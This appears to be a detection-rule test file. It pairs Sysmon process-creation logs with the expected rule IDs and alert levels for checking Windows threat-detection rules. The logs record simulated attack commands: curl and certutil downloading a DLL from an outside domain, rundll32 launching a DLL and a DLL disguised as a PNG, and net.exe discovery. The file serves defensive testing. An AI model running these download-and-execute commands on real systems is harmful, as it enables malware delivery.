log 1 pass = { "win": { "eventdata": { "originalFileName": "curl.exe", "image": "C:\\\\Windows\\\\System32\\\\curl.exe", "product": "The curl executable", "parentProcessGuid": "{94f48244-a224-618a-c400-000000002900}", "description": "The curl executable", "logonGuid": "{94f48244-a16b-618a-b5d0-110000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\"", "processGuid": "{94f48244-a252-618a-c800-000000002900}", "logonId": "0x11d0b5", "parentProcessId": "5732", "processId": "2832", "currentDirectory": "C:\\\\Users\\\\itadmin\\\\Desktop\\\\", "utcTime": "2021-11-09 16:31:14.567", "hashes": "SHA1=086F74A35D5AFED78AE50CF5586FAFFFB7845464,MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "curl, https://curl.haxx.se/", "commandLine": "curl  https://pastorcryptograph.at/3/sdd.dll -o compile.dll", "integrityLevel": "Medium", "fileVersion": "7.55.1", "user": "XRISBARNEY\\\\itadmin", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2021-11-09 16:31:14.567\r\nProcessGuid: {94f48244-a252-618a-c800-000000002900}\r\nProcessId: 2832\r\nImage: C:\\Windows\\System32\\curl.exe\r\nFileVersion: 7.55.1\r\nDescription: The curl executable\r\nProduct: The curl executable\r\nCompany: curl, https://curl.haxx.se/\r\nOriginalFileName: curl.exe\r\nCommandLine: curl  https://pastorcryptograph.at/3/sdd.dll -o compile.dll\r\nCurrentDirectory: C:\\Users\\itadmin\\Desktop\\\r\nUser: XRISBARNEY\\itadmin\r\nLogonGuid: {94f48244-a16b-618a-b5d0-110000000000}\r\nLogonId: 0x11D0B5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=086F74A35D5AFED78AE50CF5586FAFFFB7845464,MD5=1C3645EBDDBE2DA6A32A5F9FB43A3C23,SHA256=0BA1C44D0EE5B34B45B449074CDA51624150DC16B3B3C38251DF6C052ADBA205,IMPHASH=2447B641444AC52A5B600C8801CE3532\r\nParentProcessGuid: {94f48244-a224-618a-c400-000000002900}\r\nParentProcessId: 5732\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \"", "version": "5", "systemTime": "2021-11-09T16:31:14.5759152Z", "eventRecordID": "213853", "threadID": "3060", "computer": "apt29w1.xrisbarney.local", "task": "1", "processID": "2468", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92074
alert = 12
decoder = json

[certutil.exe launched from powershell created a binary file]
log 1 pass = { "win": { "eventdata": { "originalFileName": "CertUtil.exe", "image": "C:\\\\Windows\\\\System32\\\\certutil.exe", "product": "Microsoft® Windows® Operating System", "parentProcessGuid": "{94f48244-a224-618a-c400-000000002900}", "description": "CertUtil.exe", "logonGuid": "{94f48244-a16b-618a-b5d0-110000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\"", "processGuid": "{94f48244-ce01-618b-dc02-000000002900}", "logonId": "0x11d0b5", "parentProcessId": "5732", "processId": "5724", "currentDirectory": "C:\\\\Users\\\\itadmin\\\\Desktop\\\\", "utcTime": "2021-11-10 13:49:53.198", "hashes": "SHA1=70E89852F023AB7CDE0173EDA1208DBB580F1E4F,MD5=BD8D9943A9B1DEF98EB83E0FA48796C2,SHA256=8DE7B4EB1301D6CBE4EA2C8D13B83280453EB64E3B3C80756BBD1560D65CA4D2,IMPHASH=7B7F7ED372C027216AE5100589C424EA", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "certutil.exe  -urlcache -f https://pastorcryptograph.at/3/sdd.dll compile.dll", "integrityLevel": "Medium", "fileVersion": "10.0.19041.1 (WinBuild.160101.0800)", "user": "XRISBARNEY\\\\itadmin", "terminalSessionId": "1" }, "system": { "eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2021-11-10 13:49:53.198\r\nProcessGuid: {94f48244-ce01-618b-dc02-000000002900}\r\nProcessId: 5724\r\nImage: C:\\Windows\\System32\\certutil.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: CertUtil.exe\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CertUtil.exe\r\nCommandLine: certutil.exe  -urlcache -f https://pastorcryptograph.at/3/sdd.dll compile.dll\r\nCurrentDirectory: C:\\Users\\itadmin\\Desktop\\\r\nUser: XRISBARNEY\\itadmin\r\nLogonGuid: {94f48244-a16b-618a-b5d0-110000000000}\r\nLogonId: 0x11D0B5\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=70E89852F023AB7CDE0173EDA1208DBB580F1E4F,MD5=BD8D9943A9B1DEF98EB83E0FA48796C2,SHA256=8DE7B4EB1301D6CBE4EA2C8D13B83280453EB64E3B3C80756BBD1560D65CA4D2,IMPHASH=7B7F7ED372C027216AE5100589C424EA\r\nParentProcessGuid: {94f48244-a224-618a-c400-000000002900}\r\nParentProcessId: 5732\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \"", "version": "5", "systemTime": "2021-11-10T13:49:53.2469397Z", "eventRecordID": "223050", "threadID": "3060", "computer": "apt29w1.xrisbarney.local", "task": "1", "processID": "2468", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon" } } }
rule = 92075
alert = 12
decoder = json

[Cmd.exe executed from non-standard directory, may be related to link execution from mounted ISO file]
log 1 pass = {"win":{"eventdata":{"originalFileName":"Cmd.Exe","image":"C:\\\\Windows\\\\System32\\\\cmd.exe","product":"Microsoft® Windows® Operating System","parentProcessGuid":"{4dc16835-656c-6452-9ae9-1a0000000000}","description":"Windows Command Processor","logonGuid":"{4dc16835-6569-6452-47f8-190000000000}","parentCommandLine":"C:\\\\Windows\\\\Explorer.EXE","processGuid":"{4dc16835-ae24-6452-48c6-250100000000}","logonId":"0x19f847","parentProcessId":"4908","processId":"3252","currentDirectory":"E:\\\\","utcTime":"2023-05-03 18:55:32.498","hashes":"SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18","parentImage":"C:\\\\Windows\\\\explorer.exe","ruleName":"technique_id=T1204,technique_name=User Execution","company":"Microsoft Corporation","commandLine":"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\"","integrityLevel":"Medium","fileVersion":"10.0.19041.746 (WinBuild.160101.0800)","user":"EXCHANGETEST\\\\AtomicRed","terminalSessionId":"1"},"system":{"eventID":"1","keywords":"0x8000000000000000","providerGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","level":"4","channel":"Microsoft-Windows-Sysmon/Operational","opcode":"0","message":"\"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2023-05-03 18:55:32.498\r\nProcessGuid: {4dc16835-ae24-6452-48c6-250100000000}\r\nProcessId: 3252\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c start rundll32 AllTheThingsx64.dll,#2\r\nCurrentDirectory: E:\\\r\nUser: EXCHANGETEST\\AtomicRed\r\nLogonGuid: {4dc16835-6569-6452-47f8-190000000000}\r\nLogonId: 0x19F847\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {4dc16835-656c-6452-9ae9-1a0000000000}\r\nParentProcessId: 4908\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE\"","version":"5","systemTime":"2023-05-03T18:55:32.5079400Z","eventRecordID":"827261","threadID":"3616","computer":"hrmanager.ExchangeTest.com","task":"1","processID":"2708","severityValue":"INFORMATION","providerName":"Microsoft-Windows-Sysmon"}}}
rule = 92078
alert = 10
decoder = json

[Rundll32 executed from non-standard directory, may be related to link execution from mounted ISO file]
log 1 pass = {"win":{"eventdata":{"originalFileName":"Cmd.Exe","image":"C:\\\\Windows\\\\System32\\\\cmd.exe","product":"Microsoft® Windows® Operating System","parentProcessGuid":"{4dc16835-656c-6452-9ae9-1a0000000000}","description":"Windows Command Processor","logonGuid":"{4dc16835-6569-6452-47f8-190000000000}","parentCommandLine":"C:\\\\Windows\\\\Explorer.EXE","processGuid":"{4dc16835-ae24-6452-48c6-250100000000}","logonId":"0x19f847","parentProcessId":"4908","processId":"3252","currentDirectory":"E:\\\\","utcTime":"2023-05-03 18:55:32.498","hashes":"SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18","parentImage":"C:\\\\Windows\\\\explorer.exe","ruleName":"technique_id=T1204,technique_name=User Execution","company":"Microsoft Corporation","commandLine":"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\" /c start rundll32 AllTheThingsx64.dll,#2","integrityLevel":"Medium","fileVersion":"10.0.19041.746 (WinBuild.160101.0800)","user":"EXCHANGETEST\\\\AtomicRed","terminalSessionId":"1"},"system":{"eventID":"1","keywords":"0x8000000000000000","providerGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","level":"4","channel":"Microsoft-Windows-Sysmon/Operational","opcode":"0","message":"\"Process Create:\r\nRuleName: technique_id=T1204,technique_name=User Execution\r\nUtcTime: 2023-05-03 18:55:32.498\r\nProcessGuid: {4dc16835-ae24-6452-48c6-250100000000}\r\nProcessId: 3252\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\system32\\cmd.exe\" /c start rundll32 AllTheThingsx64.dll,#2\r\nCurrentDirectory: E:\\\r\nUser: EXCHANGETEST\\AtomicRed\r\nLogonGuid: {4dc16835-6569-6452-47f8-190000000000}\r\nLogonId: 0x19F847\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18\r\nParentProcessGuid: {4dc16835-656c-6452-9ae9-1a0000000000}\r\nParentProcessId: 4908\r\nParentImage: C:\\Windows\\explorer.exe\r\nParentCommandLine: C:\\Windows\\Explorer.EXE\"","version":"5","systemTime":"2023-05-03T18:55:32.5079400Z","eventRecordID":"827261","threadID":"3616","computer":"hrmanager.ExchangeTest.com","task":"1","processID":"2708","severityValue":"INFORMATION","providerName":"Microsoft-Windows-Sysmon"}}}
rule = 92079
alert = 10
decoder = json

[net.exe workstation discovery]
log 1 pass = {"win":{"eventdata":{"originalFileName":"net.exe","image":"C:\\\\Windows\\\\System32\\\\net.exe","product":"Microsoft® Windows® Operating System","parentProcessGuid":"{4dc16835-04b8-6454-9bd1-f80100000000}","description":"Net Command","logonGuid":"{4dc16835-f0be-6453-80df-2d0000000000}","parentCommandLine":"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\"","processGuid":"{4dc16835-09d6-6454-a529-180200000000}","logonId":"0x2ddf80","parentProcessId":"5664","processId":"2740","currentDirectory":"C:\\\\Users\\\\AtomicRed\\\\","utcTime":"2023-05-04 19:39:02.273","hashes":"SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07","parentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","ruleName":"technique_id=T1018,technique_name=Remote System Discovery","company":"Microsoft Corporation","commandLine":"net  config workstation","integrityLevel":"Medium","fileVersion":"10.0.19041.1 (WinBuild.160101.0800)","user":"EXCHANGETEST\\\\AtomicRed","terminalSessionId":"1"},"system":{"eventID":"1","keywords":"0x8000000000000000","providerGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","level":"4","channel":"Microsoft-Windows-Sysmon/Operational","opcode":"0","message":"\"Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2023-05-04 19:39:02.273\r\nProcessGuid: {4dc16835-09d6-6454-a529-180200000000}\r\nProcessId: 2740\r\nImage: C:\\Windows\\System32\\net.exe\r\nFileVersion: 10.0.19041.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: net  config workstation\r\nCurrentDirectory: C:\\Users\\AtomicRed\\\r\nUser: EXCHANGETEST\\AtomicRed\r\nLogonGuid: {4dc16835-f0be-6453-80df-2d0000000000}\r\nLogonId: 0x2DDF80\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: SHA1=88B101598CC6726B7A57D02B1FA95BE1B272A821,MD5=0BD94A338EEA5A4E1F2830AE326E6D19,SHA256=9F376759BCBCD705F726460FC4A7E2B07F310F52BAA73CAAAAA124FDDBDF993E,IMPHASH=57F0C47AE2A1A2C06C8B987372AB0B07\r\nParentProcessGuid: {4dc16835-04b8-6454-9bd1-f80100000000}\r\nParentProcessId: 5664\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \"","version":"5","systemTime":"2023-05-04T19:39:02.2799792Z","eventRecordID":"223471","threadID":"3508","computer":"cfo.ExchangeTest.com","task":"1","processID":"2284","severityValue":"INFORMATION","providerName":"Microsoft-Windows-Sysmon"}}}
rule = 92080
alert = 7
decoder = json

[Rundll32 executing file with suspicious extension]
log 1 pass = {"win":{"eventdata":{"originalFileName":"RUNDLL32.EXE","image":"C:\\\\Windows\\\\System32\\\\rundll32.exe","product":"Microsoft® Windows® Operating System","parentProcessGuid":"{4dc16835-b349-645e-1125-aa0000000000}","description":"Windows host process (Rundll32)","logonGuid":"{4dc16835-b21d-645e-5131-8d0000000000}","parentCommandLine":"\\\"C:\\\\Windows\\\\system32\\\\cmd.exe\\\"","processGuid":"{4dc16835-b634-645e-05df-bc0000000000}","logonId":"0x8d3151","parentProcessId":"5276","processId":"4724","currentDirectory":"C:\\\\Users\\\\AtomicRed\\\\Downloads\\\\","utcTime":"2023-05-12 21:57:08.923","hashes":"SHA1=DD399AE46303343F9F0DA189AEE11C67BD868222,MD5=EF3179D498793BF4234F708D3BE28633,SHA256=B53F3C0CD32D7F20849850768DA6431E5F876B7BFA61DB0AA0700B02873393FA,IMPHASH=4DB27267734D1576D75C991DC70F68AC","parentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","ruleName":"technique_id=T1218.002,technique_name=rundll32.exe","company":"Microsoft Corporation","commandLine":"rundll32.exe  AllTheThingsx64.png,#2","integrityLevel":"High","fileVersion":"10.0.19041.746 (WinBuild.160101.0800)","user":"EXCHANGETEST\\\\AtomicRed","terminalSessionId":"1"},"system":{"eventID":"1","keywords":"0x8000000000000000","providerGuid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","level":"4","channel":"Microsoft-Windows-Sysmon/Operational","opcode":"0","message":"\"Process Create:\r\nRuleName: technique_id=T1218.002,technique_name=rundll32.exe\r\nUtcTime: 2023-05-12 21:57:08.923\r\nProcessGuid: {4dc16835-b634-645e-05df-bc0000000000}\r\nProcessId: 4724\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nFileVersion: 10.0.19041.746 (WinBuild.160101.0800)\r\nDescription: Windows host process (Rundll32)\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: RUNDLL32.EXE\r\nCommandLine: rundll32.exe  AllTheThingsx64.png,#2\r\nCurrentDirectory: C:\\Users\\AtomicRed\\Downloads\\\r\nUser: EXCHANGETEST\\AtomicRed\r\nLogonGuid: {4dc16835-b21d-645e-5131-8d0000000000}\r\nLogonId: 0x8D3151\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=DD399AE46303343F9F0DA189AEE11C67BD868222,MD5=EF3179D498793BF4234F708D3BE28633,SHA256=B53F3C0CD32D7F20849850768DA6431E5F876B7BFA61DB0AA0700B02873393FA,IMPHASH=4DB27267734D1576D75C991DC70F68AC\r\nParentProcessGuid: {4dc16835-b349-645e-1125-aa0000000000}\r\nParentProcessId: 5276\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" \"","version":"5","systemTime":"2023-05-12T21:57:08.9296916Z","eventRecordID":"229960","threadID":"3232","computer":"cfo.ExchangeTest.com","task":"1","processID":"2272","severityValue":"INFORMATION","providerName":"Microsoft-Windows-Sysmon"}}}
rule = 92081
alert = 15
decoder = json
